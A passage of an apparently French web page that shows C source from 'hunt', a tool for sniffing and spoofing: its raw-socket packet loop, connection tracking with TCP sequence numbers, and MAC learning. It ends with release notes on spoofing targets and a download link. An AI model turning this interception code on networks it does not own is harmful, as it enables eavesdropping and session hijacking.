<br><font color="#3333FF">&nbsp;struct ethhdr *ethh;</font>
<br><font color="#3333FF">&nbsp;struct iphdr *iph;</font>
<br><font color="#3333FF">#ifdef WITH_RECVMSG</font>
<br><font color="#3333FF">&nbsp;struct msghdr msg;</font>
<br><font color="#3333FF">&nbsp;struct sockaddr_pkt spkt;</font>
<br><font color="#3333FF">&nbsp;struct iovec iov;</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">&nbsp;pthread_sigmask(SIG_BLOCK, &amp;intr_mask,
NULL);</font>
<p><font color="#3333FF">&nbsp;if (verbose)</font>
<br><font color="#3333FF">&nbsp; printf("hunt pid %d\n", getpid());</font>
<br><font color="#3333FF">&nbsp;add_telnet_rlogin_policy();</font>
<br><font color="#3333FF">&nbsp;if (hash_init(&amp;conn_table, 100, (hash_equal_func)ht_eq))
{ /* Initialize hash table of connections */</font>
<br><font color="#3333FF">&nbsp; perror("hash_init");</font>
<br><font color="#3333FF">&nbsp; exit(1);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;if (hash_init(&amp;mac_table, 100, NULL))
{</font>
<br><font color="#3333FF">&nbsp; perror("hash init");</font>
<br><font color="#3333FF">&nbsp; exit(1);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;linksock = tap(eth_device, 1);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* Setup link socket */</font>
<br><font color="#3333FF">&nbsp;if (linksock &lt; 0) {</font>
<br><font color="#3333FF">&nbsp; perror("linksock");</font>
<br><font color="#3333FF">&nbsp; exit(1);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;packet_preallocate(64);</font>
<p><font color="#3333FF">&nbsp;printf("starting hunt\n");</font>
<br><font color="#3333FF">&nbsp;setpriority(PRIO_PROCESS, getpid(), -20);</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_lock(&amp;mutex_hunt_ready);</font>
<br><font color="#3333FF">&nbsp;hunt_ready = 1;</font>
<br><font color="#3333FF">&nbsp;pthread_cond_signal(&amp;cond_hunt_ready);</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_unlock(&amp;mutex_hunt_ready);</font>
<br><font color="#3333FF">&nbsp;while(1) {</font>
<br><font color="#3333FF">&nbsp; if (!(p = packet_new())) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; fprintf(stderr, "can't get free
packet - out of memory\n");</font>
<br><font color="#3333FF">&nbsp;&nbsp; exit(1);</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">#ifdef WITH_RECVMSG</font>
<br><font color="#3333FF">&nbsp; memset(&amp;msg, 0, sizeof(msg));</font>
<br><font color="#3333FF">&nbsp; msg.msg_name = &amp;spkt;</font>
<br><font color="#3333FF">&nbsp; msg.msg_namelen = sizeof(spkt);</font>
<br><font color="#3333FF">&nbsp; msg.msg_iovlen = 1;</font>
<br><font color="#3333FF">&nbsp; msg.msg_iov = &amp;iov;</font>
<br><font color="#3333FF">&nbsp; iov.iov_base = p->p_raw;</font>
<br><font color="#3333FF">&nbsp; iov.iov_len = sizeof(p->p_raw);</font>
<br><font color="#3333FF">&nbsp; if ((p->p_raw_len = recvmsg(linksock,
&amp;msg, 0)) >= 0)</font>
<br><font color="#3333FF">#else</font>
<br><font color="#3333FF">&nbsp; if ((p->p_raw_len = recv(linksock, p->p_raw,
sizeof(p->p_raw), 0)) > 0)</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp; pkts_received++;</font>
<br><font color="#3333FF">&nbsp;&nbsp; bytes_received += p->p_raw_len;</font>
<br><font color="#3333FF">&nbsp;&nbsp; /*</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * don't do continue or break
without packet_free !!</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; */</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (p->p_raw_len &lt; 14) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp; ALIGNPOINTERS_ETH(p, ethh);</font>
<br><font color="#3333FF">&nbsp;&nbsp; p->p_ethh = ethh;</font>
<br><font color="#3333FF">&nbsp;&nbsp; /*</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * in order to speed thinks
as mutch as posible for arp stuff</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * the timestamp is moved to
swtich p->p_timestamp = time(NULL);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; */</font>
<br><font color="#3333FF">&nbsp;&nbsp; p->p_timestamp = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp; switch (ntohs(ethh->h_proto)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case ETH_P_IP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; p->p_timestamp = time(NULL);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if (p->p_raw_len &lt; 14 +
20) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ALIGNPOINTERS_IP(ethh, iph);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; p->p_iph = iph;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if (in_cksum((unsigned short *) iph,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
IP_HDR_LENGTH(iph)) == 0) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if (mac_learn_from_ip)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; mac_ip_learn(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; process_ip(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; /* drop IP fragments and ip
packet len > p_raw_len */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if ((ntohs(iph->frag_off)
&amp; IP_OFFMASK) != 0 ||</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ntohs(iph->frag_off)
&amp; IP_MF) ||</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (IP_HDR_LENGTH(iph)
+ IP_DATA_LENGTH(iph)) > p->p_raw_len) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; switch (iph->protocol) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
IPPROTO_TCP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; if (p->p_raw_len &lt;
14 + IP_HDR_LENGTH(iph) + 20) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; p->p_type = PACKET_TCP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ALIGNPOINTERS_TCP(iph,
p->p_hdr.p_tcph,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p->p_data);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; p->p_data_len = TCP_DATA_LENGTH(iph,
p->p_hdr.p_tcph);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; if (ip_in_cksum(iph,
(unsigned short *) p->p_hdr.p_tcph,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
IP_DATA_LENGTH(iph)) == 0) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn_update_table(p,
ethh, iph);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fast_tcp_process(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; process_tcp(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; } else</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
IPPROTO_UDP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; if (p->p_raw_len &lt;
14 + IP_HDR_LENGTH(iph) + 8) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; p->p_type = PACKET_UDP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ALIGNPOINTERS_UDP(iph,
p->p_hdr.p_udph,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p->p_data);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; /* check the UDP checksum
*/</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; process_udp(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case
IPPROTO_ICMP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; if (p->p_raw_len &lt;
14 + IP_HDR_LENGTH(iph) + 8) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; p->p_type = PACKET_ICMP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ALIGNPOINTERS_ICMP(iph,
p->p_hdr.p_icmph,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p->p_data);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; if (in_cksum((unsigned
short *) p->p_hdr.p_icmph,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
IP_DATA_LENGTH(iph)) == 0) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; process_icmp(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; } else</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pkts_unhandled++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; } else</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++; /* bad
IP checksum */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case ETH_P_ARP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if (p->p_raw_len &lt; 14 +
28) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pkts_dropped++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; goto cont;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; p->p_type = PACKET_ARP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ALIGNPOINTERS_ARP(ethh, p->p_arph);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; /* do process arp first -
in order to do it as fast</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; as posible
arpspoof needs it */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; process_arp(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; p->p_timestamp = time(NULL);
/* well, the process_arp does not get timestamp */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; mac_arp_learn(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; pkts_unhandled++;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">cont:</font>
<br><font color="#3333FF">&nbsp; packet_free(p);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;return NULL;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* helper functions</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">void print_tcp(struct iphdr *ip, struct tcphdr
*tcp)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stdout,
"%s [%d] seq=(%u) ack=(%u)\t--->\t%s [%d]\n",</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host_lookup(ip->saddr,
hl_mode), ntohs(tcp->source),</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned
int) ntohl(tcp->seq), tcp->ack ? (unsigned int) ntohl(tcp->ack_seq) : 0,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host_lookup(ip->daddr,
hl_mode), ntohs(tcp->dest));</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static int fill_space_to(char *b, int pos, int
where)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;if (pos >= 0 &amp;&amp; pos &lt; where)
{</font>
<br><font color="#3333FF">&nbsp; return sprintf(b, "%*s", where - pos,
"");</font>
<br><font color="#3333FF">&nbsp;} else</font>
<br><font color="#3333FF">&nbsp; return 0;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">int conn_list(struct user_conn_info **ruci, char
**rbuf, int with_mac, int with_seq)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct hash_iterator iter;</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<br><font color="#3333FF">&nbsp;struct user_conn_info *uci;</font>
<br><font color="#3333FF">&nbsp;int i, count;</font>
<br><font color="#3333FF">&nbsp;char *b, *b_old, *buf;</font>
<p><font color="#3333FF">&nbsp;hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;count = hash_count(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;if (!count) {</font>
<br><font color="#3333FF">&nbsp; hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp; if (ruci)</font>
<br><font color="#3333FF">&nbsp;&nbsp; *ruci = NULL;</font>
<br><font color="#3333FF">&nbsp; if (rbuf)</font>
<br><font color="#3333FF">&nbsp;&nbsp; *rbuf = NULL;</font>
<br><font color="#3333FF">&nbsp; return 0;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;if (rbuf) {</font>
<br><font color="#3333FF">&nbsp; buf = malloc(count * 512);</font>
<br><font color="#3333FF">&nbsp; assert(buf);</font>
<br><font color="#3333FF">&nbsp; b = buf;</font>
<br><font color="#3333FF">&nbsp;} else</font>
<br><font color="#3333FF">&nbsp; b = buf = NULL;</font>
<br><font color="#3333FF">&nbsp;if (ruci) {</font>
<br><font color="#3333FF">&nbsp; uci = malloc(count * sizeof(struct user_conn_info));</font>
<br><font color="#3333FF">&nbsp; assert(uci);</font>
<br><font color="#3333FF">&nbsp;} else</font>
<br><font color="#3333FF">&nbsp; uci = NULL;</font>
<br><font color="#3333FF">&nbsp;i = 0;</font>
<br><font color="#3333FF">&nbsp;hash_iter_set(&amp;iter, &amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;while ((ci = hash_iter_get(&amp;iter, NULL))
&amp;&amp; i &lt; count) {</font>
<br><font color="#3333FF">&nbsp; if (b) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; b_old = b;</font>
<br><font color="#3333FF">&nbsp;&nbsp; b += sprintf(b, "%d) %s [%s]", i,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
host_lookup(ci->src_addr, hl_mode),</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
port_lookup(ci->src_port, hl_mode));</font>
<br><font color="#3333FF">&nbsp;&nbsp; b += fill_space_to(b, b - b_old,
30);</font>
<br><font color="#3333FF">&nbsp;&nbsp; b += sprintf(b, " --> ");</font>
<br><font color="#3333FF">&nbsp;&nbsp; b += sprintf(b, "%s [%s]\n",</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
host_lookup(ci->dst_addr, hl_mode),</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
port_lookup(ci->dst_port, hl_mode));</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (with_seq) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b_old = b;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, "&nbsp;&nbsp;&nbsp;&nbsp;
seq=(%u) ack=(%u)",</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; (unsigned int) ntohl(ci->src.next_seq),
(unsigned int) ntohl(ci->src.next_d_seq));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += fill_space_to(b, b -
b_old, 45);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, " seq=(%u)
ack=(%u)\n",</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; (unsigned int) ntohl(ci->dst.next_seq),
(unsigned int) ntohl(ci->dst.next_d_seq));</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (with_mac) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b_old = b;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, "&nbsp;&nbsp;&nbsp;&nbsp;
src mac=");</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf_eth_mac(b, ci->src.src_mac);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += fill_space_to(b, b -
b_old, 45);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, " src mac=");</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf_eth_mac(b, ci->dst.src_mac);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, "\n");</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp; b_old = b;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, "&nbsp;&nbsp;&nbsp;&nbsp;
dst mac=");</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf_eth_mac(b, ci->src.dst_mac);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += fill_space_to(b, b -
b_old, 45);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, " dst mac=");</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf_eth_mac(b, ci->dst.dst_mac);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b += sprintf(b, "\n");</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp; if (uci) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; uci[i].src_addr = ci->src_addr;</font>
<br><font color="#3333FF">&nbsp;&nbsp; uci[i].dst_addr = ci->dst_addr;</font>
<br><font color="#3333FF">&nbsp;&nbsp; uci[i].src_port = ci->src_port;</font>
<br><font color="#3333FF">&nbsp;&nbsp; uci[i].dst_port = ci->dst_port;</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp; i++;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_iter_end(&amp;iter);</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;conn_table);</font>
<p><font color="#3333FF">&nbsp;if (ruci)</font>
<br><font color="#3333FF">&nbsp; *ruci = uci;</font>
<br><font color="#3333FF">&nbsp;if (rbuf)</font>
<br><font color="#3333FF">&nbsp; *rbuf = buf;</font>
<br><font color="#3333FF">&nbsp;return count;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void print_mac_table(void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct hash_iterator hi;</font>
<br><font color="#3333FF">&nbsp;char buf[BUFSIZE];</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<br><font color="#3333FF">&nbsp;struct mac_info *mi;</font>
<br><font color="#3333FF">&nbsp;int i = 0;</font>
<p><font color="#3333FF">&nbsp;printf("--- mac table ---\n");</font>
<br><font color="#3333FF">&nbsp;hash_iter_set(&amp;hi, &amp;mac_table);</font>
<br><font color="#3333FF">&nbsp;while ((mi = hash_iter_get(&amp;hi, &amp;key)))
{</font>
<br><font color="#3333FF">&nbsp; sprintf_eth_mac(buf, mi->mac);</font>
<br><font color="#3333FF">&nbsp; printf("%-24s %s\n", host_lookup(key,
hl_mode), buf);</font>
<br><font color="#3333FF">&nbsp; if (++i % lines_o == 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp; lines_o_press_key();</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_iter_end(&amp;hi);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void print_user_conn_info(struct user_conn_info
*uci, int count)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;int i, ret;</font>
<p><font color="#3333FF">&nbsp;for (i = 0; i &lt; count; i++) {</font>
<br><font color="#3333FF">&nbsp; ret = printf("%d) %s [%s]", i,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
host_lookup(uci->src_addr, hl_mode),</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; port_lookup(uci->src_port,
hl_mode));</font>
<br><font color="#3333FF">&nbsp; printf("%*s", 25 - ret > 0 ? 20 - ret
: 0, "");</font>
<br><font color="#3333FF">&nbsp; printf(" --> ");</font>
<br><font color="#3333FF">&nbsp; printf("%s [%s]\n",</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
host_lookup(uci->dst_addr, hl_mode),</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
port_lookup(uci->dst_port, hl_mode));</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">}</font>
<p><u>Quoi de plus sur cette version 1.4:</u>
<p>spoofing des cibles qui sont d&eacute;connect&eacute;es ou hors-service
et il peut ne pas intercepter certains packets sp&eacute;cifiques.
<p><u>O&ugrave; t&eacute;l&eacute;charger les Hunt:</u>
<p>ftp://ftp.gncz.cz/pub/linux/hunt
<br>&nbsp;
</body>
</html>
